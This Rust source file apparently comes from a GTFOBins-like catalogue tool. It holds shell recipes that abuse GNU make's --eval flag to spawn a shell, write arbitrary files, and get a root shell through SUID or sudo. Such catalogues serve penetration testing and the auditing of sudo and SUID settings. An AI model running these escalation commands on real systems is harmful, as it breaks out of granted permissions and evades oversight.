pub static BIN_NAME: &'static str = "make";
pub static BIN_DESC: &'static str = "All these examples only work with GNU `make` due to the lack of support of the `--eval` flag. The same can be achieved by using a proper `Makefile` or by passing the content via stdin using `-f -`.";
pub static SH_CODE: &'static str = r#"
    
    COMMAND='/bin/sh'
    make -s --eval=$'x:\n\t-'"$COMMAND"
"#;
pub static FW_DESC: &'static str = "Requires a newer GNU `make` version.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    make -s --eval="\$(file >$LFILE,DATA)" .
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which make) .

    COMMAND='/bin/sh -p'
    ./make -s --eval=$'x:\n\t-'"$COMMAND"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    COMMAND='/bin/sh'
    sudo make -s --eval=$'x:\n\t-'"$COMMAND"
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
